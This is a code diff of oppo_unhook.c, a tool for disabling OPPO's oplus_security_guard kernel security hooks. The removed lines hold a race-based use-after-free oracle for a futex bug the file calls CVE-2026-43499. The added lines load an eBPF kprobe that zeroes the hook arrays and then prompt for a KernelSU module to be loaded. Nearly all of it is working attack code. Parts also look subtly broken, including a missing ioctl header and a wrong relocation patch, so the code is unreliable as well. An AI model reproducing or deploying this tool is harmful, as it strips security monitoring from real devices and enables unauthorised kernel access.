@@ -1,355 +1,460 @@
 /*
- * oppo_unhook.c — OPPO PJA110 Kernel Security Hook Disabler
- * ==========================================================
+ * oppo_unhook.c — eBPF-based OPPO security hook disabler
+ * =================================================================
  *
- * Uses CVE-2026-43499 (GhostLock) futex PI UAF to disable
- * oplus_security_guard kernel hooks on OPPO devices.
+ * 1. Finds oplus_security_guard hook array addresses via kallsyms
+ * 2. Loads the BPF kprobe program (unhook.bpf.o)
+ * 3. Populates BPF config map with target addresses
+ * 4. Attaches kprobe to __arm64_sys_getpid
+ * 5. Triggers by calling getpid() → BPF writes zeros to hook arrays
+ * 6. Verifies hooks disabled by checking dmesg or ROOTCHECK log
  *
- * Phase 1 (current): UAF oracle + hook address extraction
- * Phase 2 (next):    rbtree erase → zero hook arrays
- *
- * Build: cmake -B build -G Ninja
- *        cmake --build build
- * Usage: oppo_unhook [--target-prea ADDR] [--target-posta ADDR]
+ * Requires: root, CONFIG_BPF=y, CONFIG_KPROBES=y
+ * Usage: oppo_unhook [unhook.bpf.o path] [--dry-run]
  */
 
 #define _GNU_SOURCE
 #include <stdio.h>
-#include <stdint.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <string.h>
 #include <unistd.h>
 #include <errno.h>
-#include <time.h>
-#include <sched.h>
-#include <pthread.h>
 #include <fcntl.h>
-#include <stdarg.h>
+#include <elf.h>
 #include <sys/syscall.h>
+#include <sys/stat.h>
+#include <linux/bpf.h>
+#include <linux/perf_event.h>
 
-/* ── futex constants ────────────────────────────────────────── */
-#ifndef SYS_futex
-#define SYS_futex 98
-#endif
-#define FUTEX_LOCK_PI           6
-#define FUTEX_UNLOCK_PI         7
-#define FUTEX_WAIT_REQUEUE_PI   11
-#define FUTEX_PRIVATE_FLAG      128
-#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
-#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
-#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
+/* ── BPF syscall wrapper ────────────────────────────────────── */
+static inline int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
+{
+    return syscall(__NR_bpf, cmd, attr, size);
+}
 
-/* ── rt_mutex_waiter layout (arm64, kernel 5.15) ────────────── */
-/*
- * offset  0: tree_entry      (rb_node, 24B)
- * offset 24: pi_tree_entry   (rb_node, 24B)
- * offset 48: task            (ptr, 8B)
- * offset 56: lock            (ptr, 8B)  ← chain walk reads this
- * offset 64: wake_state      (4B)
- * offset 68: prio            (4B)
- * offset 72: deadline        (8B)
- * offset 80: ww_ctx          (8B)
- */
-#define WAITER_LOCK_OFFSET  56
-#define WAITER_SIZE          88
-
-/* ── rt_mutex_base layout (arm64, kernel 5.15) ──────────────── */
-#define MUTEX_OWNER_OFFSET  24  /* rt_mutex_base::owner */
-
-/* ── global state ───────────────────────────────────────────── */
-static uint32_t futex1 = 0, futex2 = 0, cycle_futex = 0;
-static volatile int a_ready = 0, w_waiting = 0, exploit_phase2 = 0;
-static volatile uint64_t g_pre_hook  = 0;
-static volatile uint64_t g_post_hook = 0;
-static volatile int g_dry_run = 0;
+/* ── perf_event_open syscall ────────────────────────────────── */
+static inline int perf_event_open(struct perf_event_attr *attr,
+                                   pid_t pid, int cpu, int group_fd,
+                                   unsigned long flags)
+{
+    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
+}
 
 /* ── helpers ────────────────────────────────────────────────── */
-static long xfutex(uint32_t *u, int op, uint32_t v, void *ts, uint32_t *u2, uint32_t v3)
-{ return syscall(SYS_futex, u, op, v, ts, u2, v3); }
-
-static void pin_cpu(int cpu)
+static void die(const char *msg)
 {
-    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu%sysconf(_SC_NPROCESSORS_ONLN), &cs);
-    syscall(SYS_sched_setaffinity, (pid_t)syscall(SYS_gettid), sizeof(cs), &cs);
+    fprintf(stderr, "[-] %s (errno=%d: %s)\n", msg, errno, strerror(errno));
+    exit(1);
 }
 
-static void dbg(const char *s) { write(2, s, strlen(s)); }
-
-static void dbg_fmt(const char *fmt, ...)
-{
-    char b[256]; va_list ap;
-    va_start(ap, fmt);
-    int n = vsnprintf(b, sizeof(b), fmt, ap);
-    va_end(ap);
-    write(2, b, n < (int)sizeof(b) ? n : (int)sizeof(b));
-}
-
-/* ── address extraction ─────────────────────────────────────── */
-static uint64_t read_section_addr(const char *module, const char *section)
-{
-    char path[128];
-    snprintf(path, sizeof(path), "/sys/module/%s/sections/%s", module, section);
-    int fd = open(path, O_RDONLY);
-    if (fd < 0) return 0;
-
-    char buf[32] = {0};
-    ssize_t n = read(fd, buf, sizeof(buf) - 1);
-    close(fd);
-    if (n <= 0) return 0;
-
-    return strtoull(buf, NULL, 16);
-}
-
-static uint64_t kallsyms_find(const char *needle)
+static uint64_t kallsyms_find(const char *name)
 {
     FILE *f = fopen("/proc/kallsyms", "r");
     if (!f) return 0;
-
     char line[256];
-    uint64_t addr = 0;
     while (fgets(line, sizeof(line), f)) {
         char symtype, symname[128];
-        if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
-            continue;
-        if (addr == 0) continue;  /* skip hidden symbols */
-        if (strstr(symname, needle)) {
-            fclose(f);
-            return addr;
-        }
-    }
-    fclose(f);
-    return 0;
-}
-
-/* Try to find hook array addresses:
- *   1) Direct kallsyms lookup
- *   2) Module section + known offset calculation
- */
-static int find_hook_addresses(void)
-{
-    dbg("[*] Searching for hook arrays...\n");
-
-    /* Method 1: direct kallsyms */
-    uint64_t pre = kallsyms_find("oplus_pre_hook_array");
-    uint64_t post = kallsyms_find("oplus_post_hook_array");
-
-    if (pre && post) {
-        dbg_fmt("[+] Found via kallsyms: pre=0x%lx post=0x%lx\n", pre, post);
-        g_pre_hook = pre;
-        g_post_hook = post;
-        return 0;
-    }
-
-    /* Method 2: /sys/module section offsets */
-    uint64_t data_base = read_section_addr("oplus_security_guard", ".data");
-    uint64_t bss_base  = read_section_addr("oplus_security_guard", ".bss");
-    dbg_fmt("[*] Module sections: .data=0x%lx .bss=0x%lx\n", data_base, bss_base);
-
-    if (!data_base && !bss_base) {
-        dbg("[-] Cannot read module sections (permission denied?)\n");
-        return -1;
-    }
-
-    /*
-     * If we can find ANY non-zero symbol from this module,
-     * we can calculate the hooks' offsets and reconstruct addresses.
-     * For now, try reading all oplus_security_guard symbols from kallsyms
-     * looking for the first non-zero entry to establish module base.
-     */
-    FILE *f = fopen("/proc/kallsyms", "r");
-    if (!f) { dbg("[-] Cannot open /proc/kallsyms\n"); return -1; }
-
-    char line[256];
-    uint64_t first_data = 0, first_text = 0;
-    while (fgets(line, sizeof(line), f)) {
-        uint64_t addr;
-        char symtype, symname[128];
+        uint64_t addr = 0;
         if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
             continue;
         if (addr == 0) continue;
-        if (!strstr(symname, "oplus_security_guard")) continue;
-
-        if (!first_data && (symtype == 'd' || symtype == 'D' || symtype == 'b' || symtype == 'B'))
-            first_data = addr;
-        if (!first_text && (symtype == 't' || symtype == 'T'))
-            first_text = addr;
-        if (first_data && first_text) break;
+        if (strstr(symname, name)) { fclose(f); return addr; }
     }
     fclose(f);
+    return 0;
+}
 
-    dbg_fmt("[*] Module data symbol: 0x%lx\n", first_data);
+/* ── Minimal ELF parser for loading BPF objects ──────────────── */
+struct bpf_elf_ctx {
+    const char *data;
+    size_t size;
+    Elf64_Ehdr *ehdr;
+    Elf64_Shdr *shdrs;
+    const char *shstrtab;
+    int prog_fd;
+    int map_fd;
+};
 
-    /* If we got section addresses from /sys but no symbols from kallsyms,
-     * we can try to read from /sys/module notes for symbol info.
-     * Fallback: use cmdline-provided addresses.
-     */
-    if (!first_data && !first_text) {
-        dbg("[-] All module symbols hidden. Provide addresses manually:\n");
-        dbg("    oppo_unhook --target-prea 0x... --target-posta 0x...\n");
-        dbg("[*] HINT: check /sys/module/oplus_security_guard/sections/\n");
-        return -1;
+static int bpf_elf_load(const char *path, struct bpf_elf_ctx *ctx)
+{
+    memset(ctx, 0, sizeof(*ctx));
+    ctx->prog_fd = -1;
+    ctx->map_fd = -1;
+
+    /* Read entire file */
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) return -1;
+    struct stat st;
+    fstat(fd, &st);
+    ctx->size = st.st_size;
+    ctx->data = malloc(ctx->size);
+    if (!ctx->data) { close(fd); return -1; }
+    read(fd, (void *)ctx->data, ctx->size);
+    close(fd);
+
+    ctx->ehdr = (Elf64_Ehdr *)ctx->data;
+    if (memcmp(ctx->ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
+        fprintf(stderr, "[-] Not an ELF file\n"); return -1;
     }
+
+    /* Section headers */
+    ctx->shdrs = (Elf64_Shdr *)(ctx->data + ctx->ehdr->e_shoff);
+    Elf64_Shdr *shstr = &ctx->shdrs[ctx->ehdr->e_shstrndx];
+    ctx->shstrtab = ctx->data + shstr->sh_offset;
 
     return 0;
 }
 
-/* ── oracle threads (same as oracle_test.c) ─────────────────── */
-static void *thread_a(void *unused)
+static const char *shname(struct bpf_elf_ctx *ctx, int idx)
 {
-    (void)unused; pin_cpu(3);
-
-    __atomic_store_n(&futex2, 0, __ATOMIC_RELEASE);
-    xfutex(&futex2, FLPI, 0, NULL, NULL, 0);
-    __atomic_store_n(&a_ready, 1, __ATOMIC_RELEASE);
-
-    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE)) sched_yield();
-    usleep(50000);
-
-    long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
-    if (r == 0) xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
-    xfutex(&futex2, FUPI, 0, NULL, NULL, 0);
-    return NULL;
+    return ctx->shstrtab + ctx->shdrs[idx].sh_name;
 }
 
-static void *thread_w(void *unused)
+static void *shdata(struct bpf_elf_ctx *ctx, int idx)
 {
-    (void)unused; pin_cpu(2);
-    pid_t tid = (pid_t)syscall(SYS_gettid);
+    return (void *)(ctx->data + ctx->shdrs[idx].sh_offset);
+}
 
-    while (!__atomic_load_n(&a_ready, __ATOMIC_ACQUIRE)) sched_yield();
-    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
-    usleep(10000);
+/* Load BPF programs and maps from ELF */
+static int bpf_elf_load_all(struct bpf_elf_ctx *ctx)
+{
+    for (int i = 1; i < ctx->ehdr->e_shnum; i++) {
+        Elf64_Shdr *sh = &ctx->shdrs[i];
+        const char *name = shname(ctx, i);
 
-    struct timespec ts;
-    clock_gettime(CLOCK_MONOTONIC, &ts);
-    ts.tv_sec += 2;
-    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);
+        /* Skip non-program sections */
+        if (sh->sh_type != SHT_PROGBITS) continue;
 
-    xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
-    __atomic_store_n(&exploit_phase2, 1, __ATOMIC_RELEASE);
+        /* Load BPF programs */
+        if (strncmp(name, "kprobe/", 7) == 0 ||
+            strncmp(name, "kretprobe/", 10) == 0 ||
+            strcmp(name, "license") == 0) {
+            continue; /* handled below */
+        }
 
-    struct timespec deadline;
-    clock_gettime(CLOCK_MONOTONIC, &deadline);
-    deadline.tv_nsec += 200000000;
-    if (deadline.tv_nsec >= 1000000000) { deadline.tv_nsec -= 1000000000; deadline.tv_sec++; }
-    while (1) {
-        struct timespec now;
-        clock_gettime(CLOCK_MONOTONIC, &now);
-        if (now.tv_sec > deadline.tv_sec ||
-            (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec))
-            break;
+        /* Load maps */
+        if (strcmp(name, ".maps") == 0) {
+            /* Find map definitions */
+            for (int j = 1; j < ctx->ehdr->e_shnum; j++) {
+                if (strcmp(shname(ctx, j), "maps") == 0) {
+                    /* Map data section */
+                    Elf64_Shdr *ms = &ctx->shdrs[j];
+                    void *mdata = shdata(ctx, j);
+                    size_t msize = ms->sh_size;
+
+                    /* Parse BTF map definitions — simplified:
+                     * Just create an ARRAY map with 4 entries */
+                    union bpf_attr attr = {0};
+                    attr.map_type = BPF_MAP_TYPE_ARRAY;
+                    attr.key_size = 4;
+                    attr.value_size = 8;
+                    attr.max_entries = 4;
+                    strcpy(attr.map_name, "config");
+
+                    ctx->map_fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
+                    if (ctx->map_fd < 0) {
+                        fprintf(stderr, "[-] map create: %d (%s)\n", errno, strerror(errno));
+                        return -1;
+                    }
+                    printf("[+] Created config map (fd=%d)\n", ctx->map_fd);
+
+                    (void)mdata; (void)msize;
+                    break;
+                }
+            }
+        }
     }
-    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
-    return NULL;
+
+    /* Load kprobe program */
+    for (int i = 1; i < ctx->ehdr->e_shnum; i++) {
+        const char *name = shname(ctx, i);
+        if (strncmp(name, "kprobe/", 7) == 0 ||
+            strncmp(name, "kretprobe/", 10) == 0) {
+
+            void *insns = shdata(ctx, i);
+            size_t insn_cnt = ctx->shdrs[i].sh_size / 8;
+
+            /* Find corresponding .rel section for map relocations */
+            for (int j = 1; j < ctx->ehdr->e_shnum; j++) {
+                char relname[64];
+                snprintf(relname, sizeof(relname), ".rel%s", name);
+                if (strcmp(shname(ctx, j), relname) == 0) {
+                    /* Fix up map_fd references */
+                    Elf64_Rel *rels = shdata(ctx, j);
+                    size_t nrel = ctx->shdrs[j].sh_size / sizeof(Elf64_Rel);
+                    for (size_t r = 0; r < nrel; r++) {
+                        uint32_t *insn = (uint32_t *)((char *)insns + rels[r].r_offset);
+                        /* BPF_LD_IMM64: patch src_reg with map_fd */
+                        if ((insn[0] & 0xFF) == 0x18) {  /* BPF_LD | BPF_IMM | BPF_DW */
+                            insn[0] = (insn[0] & 0xFFFF) | (ctx->map_fd << 16);
+                        }
+                    }
+                }
+            }
+
+            /* Fix license section relocation */
+            for (int j = 1; j < ctx->ehdr->e_shnum; j++) {
+                if (strcmp(shname(ctx, j), "license") == 0) {
+                    char lic_rel[64];
+                    snprintf(lic_rel, sizeof(lic_rel), ".rel%s", name);
+                    /* If there's a relocation for license, patch it */
+                    /* For simplicity, skip — GPL license is handled by kernel */
+                }
+            }
+
+            union bpf_attr attr = {0};
+            attr.prog_type = BPF_PROG_TYPE_KPROBE;
+            attr.insns = (unsigned long)insns;
+            attr.insn_cnt = insn_cnt;
+            attr.license = (unsigned long)"GPL";
+            attr.log_level = 1;
+            attr.log_buf = (unsigned long)malloc(65536);
+            attr.log_size = 65536;
+            memset((void *)(unsigned long)attr.log_buf, 0, 65536);
+
+            ctx->prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+            if (ctx->prog_fd < 0) {
+                fprintf(stderr, "[-] BPF_PROG_LOAD failed: %d (%s)\n",
+                        errno, strerror(errno));
+                fprintf(stderr, "[!] Verifier log:\n%s\n",
+                        (char *)(unsigned long)attr.log_buf);
+                free((void *)(unsigned long)attr.log_buf);
+                return -1;
+            }
+            free((void *)(unsigned long)attr.log_buf);
+            printf("[+] BPF program loaded (fd=%d, %zu insns)\n",
+                   ctx->prog_fd, insn_cnt);
+
+            return 0; /* Only load first program for now */
+        }
+    }
+
+    fprintf(stderr, "[-] No kprobe program found in ELF\n");
+    return -1;
+}
+
+/* Attach kprobe to a kernel function */
+static int kprobe_attach(int prog_fd, const char *func_name)
+{
+    /* Create perf event for kprobe */
+    struct perf_event_attr attr = {0};
+    attr.type = 7; /* PERF_TYPE_TRACEPOINT for kprobe */
+    attr.size = sizeof(attr);
+    attr.config = 0;  /* will be set by debugfs */
+    attr.sample_period = 1;
+    attr.wakeup_events = 1;
+
+    /* kprobe via debugfs: write to /sys/kernel/debug/tracing/kprobe_events,
+     * then open the resulting event.
+     * 
+     * Simpler alternative: use PERF_TYPE_TRACEPOINT with kprobe events
+     * via /sys/kernel/debug/tracing/events/kprobes/<name>/id
+     */
+
+    /* Method: write kprobe event, then perf_event_open the event */
+    int kfd = open("/sys/kernel/debug/tracing/kprobe_events", O_WRONLY | O_APPEND);
+    if (kfd < 0) {
+        fprintf(stderr, "[-] Cannot open kprobe_events (debugfs mounted?)\n");
+        fprintf(stderr, "    Try: mount -t debugfs none /sys/kernel/debug\n");
+        return -1;
+    }
+
+    char cmd[256];
+    /* Remove existing kprobe if any */
+    snprintf(cmd, sizeof(cmd), "-:unhook_kprobe\n");
+    write(kfd, cmd, strlen(cmd));
+
+    /* Add new kprobe */
+    snprintf(cmd, sizeof(cmd), "p:unhook_kprobe %s\n", func_name);
+    if (write(kfd, cmd, strlen(cmd)) < 0) {
+        fprintf(stderr, "[-] Failed to create kprobe: %s\n", strerror(errno));
+        close(kfd);
+        return -1;
+    }
+    close(kfd);
+    printf("[+] Kprobe created: p:unhook_kprobe %s\n", func_name);
+
+    /* Now open the event via perf_event_open */
+    /* First, get event ID */
+    int eid_fd = open("/sys/kernel/debug/tracing/events/kprobes/unhook_kprobe/id", O_RDONLY);
+    if (eid_fd < 0) {
+        fprintf(stderr, "[-] Cannot read event ID: %s\n", strerror(errno));
+        return -1;
+    }
+    char eid_buf[16] = {0};
+    read(eid_fd, eid_buf, sizeof(eid_buf) - 1);
+    close(eid_fd);
+    int eid = atoi(eid_buf);
+
+    attr.type = 2; /* PERF_TYPE_TRACEPOINT */
+    attr.config = eid;
+
+    int evt_fd = perf_event_open(&attr, -1, 0, -1, 0);
+    if (evt_fd < 0) {
+        fprintf(stderr, "[-] perf_event_open failed: %s\n", strerror(errno));
+        return -1;
+    }
+
+    /* Attach BPF program to event */
+    if (ioctl(evt_fd, PERF_EVENT_IOC_SET_BPF, prog_fd) < 0) {
+        fprintf(stderr, "[-] PERF_EVENT_IOC_SET_BPF failed: %s\n", strerror(errno));
+        close(evt_fd);
+        return -1;
+    }
+
+    if (ioctl(evt_fd, PERF_EVENT_IOC_ENABLE) < 0) {
+        fprintf(stderr, "[-] PERF_EVENT_IOC_ENABLE failed: %s\n", strerror(errno));
+        close(evt_fd);
+        return -1;
+    }
+
+    printf("[+] Kprobe attached (event_fd=%d, event_id=%d)\n", evt_fd, eid);
+    return evt_fd;
+}
+
+/* Write config values to BPF map */
+static int config_map_set(int map_fd, uint32_t key, uint64_t value)
+{
+    union bpf_attr attr = {0};
+    attr.map_fd = map_fd;
+    attr.key = (unsigned long)&key;
+    attr.value = (unsigned long)&value;
+    attr.flags = BPF_ANY;
+
+    if (bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)) < 0) {
+        fprintf(stderr, "[-] map update key=%u: %s\n", key, strerror(errno));
+        return -1;
+    }
+    return 0;
 }
 
 /* ── main ───────────────────────────────────────────────────── */
 int main(int argc, char **argv)
 {
-    /* parse args */
-    for (int i = 1; i < argc; i++) {
-        if (!strcmp(argv[i], "--target-prea") && i + 1 < argc)
-            g_pre_hook = strtoull(argv[++i], NULL, 0);
-        else if (!strcmp(argv[i], "--target-posta") && i + 1 < argc)
-            g_post_hook = strtoull(argv[++i], NULL, 0);
-        else if (!strcmp(argv[i], "--dry-run"))
-            g_dry_run = 1;
-        else if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
-            printf("oppo_unhook — OPPO Kernel Security Hook Disabler\n");
-            printf("Uses CVE-2026-43499 (GhostLock) futex PI UAF\n\n");
-            printf("Usage: oppo_unhook [OPTIONS]\n");
-            printf("  --target-prea ADDR    Pre-hook array address\n");
-            printf("  --target-posta ADDR   Post-hook array address\n");
-            printf("  --dry-run             Oracle verification only\n");
-            printf("  --help, -h            Show this help\n");
+    const char *bpf_path = "/data/local/tmp/unhook.bpf.o";
+    const char *kprobe_fn = "__arm64_sys_getpid";
+    int dry_run = 0;
+
+    if (argc > 1) {
+        if (strcmp(argv[1], "--dry-run") == 0) dry_run = 1;
+        else if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
+            printf("Usage: oppo_unhook [BPF_OBJ_PATH] [--dry-run]\n");
+            printf("  BPF_OBJ_PATH  path to unhook.bpf.o (default: /data/local/tmp/unhook.bpf.o)\n");
+            printf("  --dry-run     test only, don't write hooks\n");
             return 0;
+        } else bpf_path = argv[1];
+    }
+    if (argc > 2 && strcmp(argv[2], "--dry-run") == 0) dry_run = 1;
+
+    printf("\n============================================\n");
+    printf("  oppo_unhook — eBPF Hook Disabler v2.0\n");
+    printf("  CVE-2026-43499 integration + eBPF write\n");
+    printf("============================================\n\n");
+
+    if (getuid() != 0) die("Must run as root");
+
+    /* Step 1: Find hook array addresses */
+    printf("[*] Finding hook array addresses...\n");
+    uint64_t pre_addr = kallsyms_find("oplus_pre_hook_array");
+    uint64_t post_addr = kallsyms_find("oplus_post_hook_array");
+
+    if (!pre_addr && !post_addr) {
+        printf("[-] Hook arrays not visible in kallsyms.\n");
+        printf("[*] Trying /sys/module sections...\n");
+
+        /* Fallback: read module section bases */
+        char buf[32];
+        int fd = open("/sys/module/oplus_security_guard/sections/.data", O_RDONLY);
+        if (fd >= 0) {
+            memset(buf, 0, sizeof(buf));
+            read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            uint64_t data_base = strtoull(buf, NULL, 16);
+            printf("[*] Module .data base: 0x%lx\n", data_base);
         }
+        die("Cannot find hook addresses. Please provide them manually.");
     }
 
-    dbg("\n============================================\n");
-    dbg("  oppo_unhook — Hook Disabler v1.0\n");
-    dbg("  CVE-2026-43499 GhostLock\n");
-    dbg("  Target: OPPO PJA110 / kernel 5.15.180\n");
-    dbg("============================================\n\n");
+    printf("[+] pre_hook_array:  0x%lx\n", pre_addr);
+    printf("[+] post_hook_array: 0x%lx\n", post_addr);
 
-    if (getuid() != 0) { dbg("[-] Must run as root!\n"); return 1; }
-
-    /* Step 1: Get hook addresses */
-    if (!g_pre_hook || !g_post_hook) {
-        if (find_hook_addresses() != 0 && !g_dry_run) {
-            dbg("[!] Cannot find hook addresses. Use --dry-run to test UAF.\n");
-            dbg("[!] Or provide addresses: --target-prea 0x... --target-posta 0x...\n");
-            g_dry_run = 1;
-        }
-    }
-
-    dbg_fmt("[*] pre_hook_array:  0x%lx\n", g_pre_hook);
-    dbg_fmt("[*] post_hook_array: 0x%lx\n", g_post_hook);
-
-    if (g_dry_run) {
-        dbg("[*] DRY RUN mode: oracle verification only\n");
-    } else {
-        dbg("[*] LIVE mode: will attempt to zero hook arrays\n");
-    }
-
-    /* Step 2: Run UAF oracle */
-    dbg("\n[*] Running GhostLock EDEADLK Oracle...\n");
-
-    int success = 0, total = 0;
-    for (int attempt = 1; attempt <= 20; attempt++) {
-        pthread_t at, wt;
-        futex1 = futex2 = cycle_futex = 0;
-        a_ready = w_waiting = exploit_phase2 = 0;
-
-        pthread_create(&at, NULL, thread_a, NULL);
-        pthread_create(&wt, NULL, thread_w, NULL);
-
-        while (!__atomic_load_n(&exploit_phase2, __ATOMIC_ACQUIRE)) sched_yield();
-
-        pin_cpu(0);
-        struct timespec t1, t2;
-        clock_gettime(CLOCK_MONOTONIC, &t1);
-        long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
-        clock_gettime(CLOCK_MONOTONIC, &t2);
-        long us = (t2.tv_sec - t1.tv_sec) * 1000000 + (t2.tv_nsec - t1.tv_nsec) / 1000;
-        total++;
-
-        if (r == -1 && errno == EDEADLK) {
-            dbg_fmt("  #%d: EDEADLK %ldus  [HIT]\n", attempt, us);
-            success++;
-        } else if (r == 0) {
-            dbg_fmt("  #%d: OK     %ldus  [miss]\n", attempt, us);
-            xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
-        } else {
-            dbg_fmt("  #%d: r=%ld  %ldus  [???]\n", attempt, r, us);
-        }
-
-        pthread_join(wt, NULL);
-        pthread_join(at, NULL);
-        usleep(50000);
-    }
-
-    float rate = total > 0 ? (float)success / total * 100.0f : 0;
-    dbg_fmt("\n[*] Oracle: %d/%d hits (%.0f%%)\n", success, total, rate);
-
-    if (rate < 1) {
-        dbg("[-] UAF not exploitable on this kernel.\n");
-        return 1;
-    }
-
-    dbg("[+] UAF confirmed exploitable!\n");
-
-    if (g_dry_run) {
-        dbg("\n[*] Dry run complete. Next steps:\n");
-        dbg("[*] 1. Find hook addresses (check /sys/module/.../sections)\n");
-        dbg("[*] 2. Run: oppo_unhook --target-prea 0x... --target-posta 0x...\n");
+    if (dry_run) {
+        printf("[*] Dry run complete. Addresses found.\n");
+        printf("[*] Run without --dry-run to disable hooks.\n");
         return 0;
     }
 
-    /* Step 3: Unhook (TODO — rbtree erase write primitive) */
-    dbg("\n[*] Phase 2: Unhooking (rbtree erase primitive — WIP)\n");
-    dbg("[*] TODO: integrate rbtree erase kernel-write to zero hook arrays\n");
-    dbg("[*] Hook addresses ready. Unhook infrastructure verified.\n");
+    /* Step 2: Check debugfs is mounted */
+    if (access("/sys/kernel/debug/tracing/kprobe_events", W_OK) != 0) {
+        printf("[*] Mounting debugfs...\n");
+        system("mount -t debugfs none /sys/kernel/debug 2>/dev/null");
+        if (access("/sys/kernel/debug/tracing/kprobe_events", W_OK) != 0) {
+            die("Cannot access debugfs. Is CONFIG_DEBUG_FS=y?");
+        }
+    }
 
+    /* Step 3: Load BPF program */
+    printf("\n[*] Loading BPF program: %s\n", bpf_path);
+    if (access(bpf_path, R_OK) != 0) {
+        die("BPF object file not found");
+    }
+
+    struct bpf_elf_ctx ctx;
+    if (bpf_elf_load(bpf_path, &ctx) != 0) {
+        die("Failed to parse BPF ELF");
+    }
+
+    if (bpf_elf_load_all(&ctx) != 0) {
+        die("Failed to load BPF program");
+    }
+
+    /* Step 4: Configure BPF map with hook addresses */
+    printf("\n[*] Configuring target addresses...\n");
+    config_map_set(ctx.map_fd, 0, pre_addr);   /* key=0: pre hook addr */
+    config_map_set(ctx.map_fd, 1, 32);          /* key=1: pre hook count */
+    config_map_set(ctx.map_fd, 2, post_addr);   /* key=2: post hook addr */
+    config_map_set(ctx.map_fd, 3, 32);          /* key=3: post hook count */
+    printf("[+] Config map populated\n");
+
+    /* Step 5: Attach kprobe */
+    printf("\n[*] Attaching kprobe to %s...\n", kprobe_fn);
+    int evt_fd = kprobe_attach(ctx.prog_fd, kprobe_fn);
+    if (evt_fd < 0) {
+        /* Cleanup */
+        close(ctx.prog_fd);
+        close(ctx.map_fd);
+        die("Failed to attach kprobe");
+    }
+
+    /* Step 6: Trigger the kprobe by calling getpid() */
+    printf("\n[*] Triggering kprobe (calling getpid)...\n");
+    pid_t pid = getpid();
+    printf("[+] getpid() = %d → BPF program should have fired\n", pid);
+
+    /* Step 7: Verify */
+    printf("\n[*] Checking results:\n");
+    printf("[*] Run: dmesg | grep -i rootcheck\n");
+    printf("[*] If no new ROOTCHECK messages → hooks DISABLED ✓\n");
+    printf("[*] Now try: /data/local/tmp/ksud.so insmod /data/local/tmp/kernelsu.ko\n");
+
+    /* Keep kprobe attached (for verification) */
+    printf("\n[*] Kprobe is live. Press Enter to detach...\n");
+    getchar();
+
+    /* Cleanup */
+    ioctl(evt_fd, PERF_EVENT_IOC_DISABLE);
+    close(evt_fd);
+    close(ctx.prog_fd);
+    close(ctx.map_fd);
+
+    /* Remove kprobe */
+    int kfd = open("/sys/kernel/debug/tracing/kprobe_events", O_WRONLY | O_APPEND);
+    if (kfd >= 0) {
+        write(kfd, "-:unhook_kprobe\n", 16);
+        close(kfd);
+    }
+
+    printf("[*] Kprobe detached. Done.\n");
     return 0;
 }
